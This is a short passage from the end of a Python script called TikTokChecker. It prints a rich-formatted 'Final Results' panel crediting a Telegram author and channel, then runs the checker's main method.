                f"Checker By [bold purple]8h3[/bold purple]\n"
                f"Telegram: @eight8eigj\n"
                f"Channel: https://t.me/eight8cloud",
                title="Final Results",
                border_style="green",
                expand=False
            )

            console.print(final_panel)
            input("\nPress Enter to exit...")

if __name__ == "__main__":
    checker = TikTokChecker()
    checker.main()